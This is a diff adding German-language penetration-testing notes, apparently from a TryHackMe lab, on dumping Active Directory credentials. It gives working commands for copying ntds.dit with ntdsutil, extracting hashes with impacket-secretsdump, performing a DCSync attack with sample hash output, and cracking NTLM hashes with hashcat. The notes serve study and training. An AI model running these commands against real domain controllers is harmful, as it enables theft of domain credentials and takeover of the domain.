@@ -430,12 +430,100 @@ mimikatz # sekurlsa::credman
 
 # Domain Controller
 
+### NTDS Domain Controller
+
+New Technologie Directory Services NTDS ist die Datenbank, die alle Daten des Active Directories enthält inklusive Objekte, Attribute Credentials und so weiter. Die NTDS.DTS Datei besteht aus drei Tabellen:
+
+- Schema Table: enthält die Typen von Objekten und deren Beziehungen
+- Link Table: enthält die Attribute von Objekten und deren Werte
+- Data Type: enthält User und Gruppen
+
+NTDS befindet sich in C:\Windows\NTDS bei default und ist verschlüsselt, damit keine Daten herausgezogen werden können. Auf die NTDS.dit Datei bei einer laufenden Maschine zuzugreifen ist nicht erlaubt, da sie vom Active Directory genutzt und verschlossen ist. Es gibt alerdings Wege Zugang zu bekommen. Wir lernen wie wir eine Kopie der NTDS erstellen können mit NTDSUTIL und Diskshadow und letztendlich auch einen Dump erstellen. Es ist wichtig zu beachten, dass man zum entschlüsseln der NTDS Datei einen System Boot Key benötigt, damit man an die LSA isolierten Credentials kommt, die in dem SECURITY File System gespeichert sind. Daher müssen wir die Security Datei ebenfalls dumpen, die alle benötigten Dateien enthält, die wir zum entschlüsseln brauchen.
+
+### NTDSUTIL
+
+Ntdsutil ist ein Windows Tool um Active Directories zu managen und pflegen. Es kann ich verschiedenen Fällen eingesetzt werden:
+
+- Gelöschte Objekte im AD widerherstellen
+- Pflege des AD
+- AD Snapshot Management
+- Set Directory Service Restore Mode (DSRM) Admin Password
+
+Für mehr Infos einfach die Microsoft Seite [besuchen](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753343(v=ws.11))
+
+### Local Dumping (No Credentials)
+
+Das wird normalerweise gemacht wenn du keine Credentials besitzt, aber dennoch einen administrativen Zugang zum Domain Controller. Dafür werden wir Windows Tools nutzen um die NTDS Datei zu dumpen und sie Offline zu cracken. Als eine Bedingung brauchen wir aber nunmal den Admin Zugang.
+
+Um den Inhalt der NTDS Datei zu dumpen benötigen wir folgende Dateien:
+
+- C:\Windows\NTDS\ntds.dit
+- C:\Windows\System32\config\SYSTEM
+- C:\Windows\System32\config\SECURITY
 
 
+mit folgendem One-Line können wir einfach die Dateien dumpen und im Temp Ordner ablegen:
 
+```bash
+powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
+```
 
+Wir laden uns die Datein auf unsere Maschine und extrahieren die Hashes:
 
+```bash
+user@machine$ impacket-secretsdump -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local
+```
 
+### Remote Dumping (With Credentials)
 
+Wir haben uns angeschaut, wie wir Hashes aus dem Speicher bekommen, ohne Credentials zu haben. Jetzt geht es darum wie wir System und Domain Controller Hashes dumpen die Credentials benötigen, wie z.b. Passwörter oder NTLM Hashes. Wir brauchen außerdem Credentials für User mit administrativen Zugang zu einem Domain Controller oder spezielle Berechtigungen wie in der DCSync Sektion bereits erwähnt.
 
+### DC Sync
 
+Der DC Sync ist eine sehr beliebte attacke im Active Directory um Credentials remote zu dumpen. Die Attacke funktioniert wenn ein Account oder AD Admin Account kompromettiert wurde der folgende Berechtigungen hat:
+
+- Replicating Directory Changes
+- Replicating Directory Changes All
+- Replicating Directory Changes in Filtered Set
+
+Ein Angreifer nutzt diese Konfig aus um eine Domain Replikation durchzuführen, die auch DC Sync genannt wird, oder Domain Controller Sync. 
+
+Wir können Mimikatz für die DC Sync Attacke nutzen wie schon im Persisting AD Room, aber hier nutzen wir SecretsDump von Impacket:
+
+```bash
+user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -just-dc THM.red/<AD_Admin_User>@10.10.45.102 
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
+thm.red\thm:1114:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
+```
+
+Let's explain the command a bit more.
+
+- the -just-dc argument is for extracting the NTDS data.
+- the thm.red/AD_Admin_User is the authenticated domain user in the form of (domain/user).
+
+Wir können auch nur die NTLM Hashes dumpen wenn wir einfach dem Argument ***-just-dc*** ein -ntlm anhängen.
+
+```bash
+user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -just-dc-ntlm THM.red/<AD_Admin_User>@10.10.45.102
+```
+
+Wir können jetzt diese Hashwerte nehmen und uns als andere User ausgeben oder auch auf unserer Maschine mit Hashcat cracken.
+
+```bash
+user@machine$ hashcat -m 1000 -a 0 /path/to/ntlm_hashes.txt /path/to/wordlist/such/as/rockyou.txt
+```
+
+Anmerkung: 
+
+Um nur den System Boot Key Value zu bekommen müssen wir folgendes ausführen:
+
+>impacket-secretsdump -system System
+
+# Local Administrator Password Solution (LAPS)
